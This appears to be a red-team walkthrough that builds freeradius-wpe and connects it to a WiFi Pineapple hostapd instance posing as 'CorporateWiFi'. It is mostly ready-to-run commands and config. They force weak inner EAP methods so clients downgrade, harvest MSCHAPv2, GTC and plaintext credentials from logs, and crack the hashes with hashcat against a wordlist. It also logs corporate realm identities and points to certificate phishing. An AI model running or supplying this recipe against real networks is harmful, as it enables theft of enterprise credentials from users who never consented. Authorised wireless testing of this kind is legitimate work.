# freeradius-wpe — walkthrough

**Verified against:** brad-anton/freeradius-wpe (patch series against FreeRADIUS 3.0.x) as of 2026-Q3

Build the WPE-patched freeradius, wire it to a Pineapple hostapd
instance, harvest MSCHAPv2 / GTC / PAP inner material.

## Preconditions

- Linux host (Kali is easiest); freeradius-wpe on the Pineapple
  directly is possible but painful.
- Root privileges.
- The Pineapple's hostapd config already points its `auth_server_addr`
  at your host's IP.

## Path A — Build and install freeradius-wpe

```
# Debian/Ubuntu (packaged freeradius 3.0.x under /etc/freeradius/3.0)
apt install build-essential libssl-dev libtalloc-dev freeradius-dev

git clone https://github.com/brad-anton/freeradius-wpe   # canonical fork
cd freeradius-wpe

# The fork ships as a patch series against upstream freeradius 3.0.x.
# Follow its README: patch the corresponding freeradius source tree,
# then build against the packaged /etc/freeradius/3.0 config tree.
```

Config lives under `/etc/freeradius/3.0/` (the standard Debian
package layout). The WPE patch modifies the *existing* `default`
site and `eap` module in place.

## Path B — Configure the WPE-patched default site

```
cd /etc/freeradius/3.0

# The default site is already the "outer" server that hostapd
# talks to; the WPE patch teaches it to log inner-EAP material.
# No extra symlinks are needed — the patched files are:
#   sites-available/default   (WPE-patched)
#   sites-enabled/default     (already a symlink to sites-available/default)
#   mods-available/eap        (WPE-patched)
#   mods-enabled/eap          (already a symlink to mods-available/eap)

# Set the shared secret so hostapd can talk to us.
cat > clients.conf <<EOF
client pineapple {
    ipaddr = 172.16.42.1
    secret = testing123
}
client localhost {
    ipaddr = 127.0.0.1
    secret = testing123
}
EOF

# EAP methods enabled by default in the WPE fork:
#   MD5, MSCHAPv2, PEAP, TTLS, TLS.
# Weak inner methods are ordered first so the client-side
# downgrade attack succeeds — tune the `default_eap_type`
# and `phase2` blocks in mods-available/eap.
```

## Path C — Launch and point hostapd at it

```
# In a foreground shell for debug:
sudo freeradius -X

# In another shell, on the Pineapple:
cat > /tmp/rogue-eap.conf <<EOF
interface=wlan1
ssid=CorporateWiFi
hw_mode=g
channel=6
wpa=2
wpa_key_mgmt=WPA-EAP
ieee8021x=1
rsn_pairwise=CCMP
auth_server_addr=<your-laptop-IP>
auth_server_port=1812
auth_server_shared_secret=testing123
EOF
hostapd /tmp/rogue-eap.conf
```

When a client associates and starts EAP, both freeradius-wpe and
hostapd log the exchange.

## Path D — Read the harvest

```
tail -F /var/log/freeradius/radius.log
# and, for the credentials mirror WPE writes on capture:
tail -F /etc/freeradius/3.0/mods-config/files/authorize
```

Look for hashcat / John / plaintext-token lines. Pipe MSCHAPv2 hash
lines (formatted as `user::domain::<NTResponse>:<ChallengeHash>`;
see the derivation callout in `enterprise/reference.md`) into
`hashcat -m 5500`:

```
grep 'hashcat -m 5500' /var/log/freeradius/radius.log \
  | awk -F': ' '{print $2}' > /tmp/mschap.hashes
hashcat -m 5500 /tmp/mschap.hashes rockyou.txt -w 4
```

## Path E — Fake-realm forwarding

To catch clients that try to authenticate to their *real* corporate
realm and fall back to us on failure:

```
# In sites-available/default (WPE-patched):
authorize {
    ...
    if (User-Name =~ /@(corp\.local|acme\.example)$/) {
        # Log the identity, accept in the tunnel anyway.
        update reply { WPE-Identity := "%{User-Name}" }
    }
}
```

Every realm hits the same permissive tunnel; realm-identity is
logged with the credentials.

## Failure modes

- **Client rejects the cert.** Rewrite the certs under
  `/etc/freeradius/3.0/certs/` with a matching CN. See
  `enterprise/walkthrough.md` for cert phishing.
- **freeradius fails to start with "eap: rlm_eap: No EAP method
  configured".** `mods-enabled/eap` is missing or the patched
  `mods-available/eap` was overwritten by a package upgrade. Confirm
  the WPE patch is still applied.
- **Nothing logs even though hostapd shows EAP frames.** Shared
  secret mismatch or firewall dropping 1812/UDP.

## Cite

- freeradius-wpe canonical fork: **brad-anton/freeradius-wpe** on
  GitHub (patch series against FreeRADIUS 3.0.x).
- freeradius.org upstream docs.
- Gabriel Ryan — eaphammer talks.
- Wright — asleap; hacking-exposed-wireless-3e.
- attacks.json: `rogue-radius-hostapd-wpe`,
  `eap-inner-downgrade-peap-mschapv2`,
  `eap-gtc-plaintext-token-capture`.
